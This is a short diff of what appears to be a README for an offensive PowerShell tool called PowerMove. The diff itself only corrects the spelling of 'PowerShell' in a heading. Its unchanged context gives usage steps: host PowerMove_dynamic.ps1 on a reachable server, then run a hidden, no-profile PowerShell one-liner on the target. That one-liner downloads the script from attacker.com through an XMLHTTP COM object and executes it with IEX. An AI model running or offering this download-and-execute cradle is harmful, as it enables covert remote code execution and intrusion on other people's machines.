@@ -32,7 +32,7 @@ Tested on PowerShell version: `5.1.26100.4202`
 4. Host `PowerMove_dynamic.ps1` on a server reachable by the target
 5. Execute on the target
 
-### Using Powershell
+### Using PowerShell
 ```powershell
 powershell.exe -nop -w hidden -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','http://attacker.com/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText""
 ```
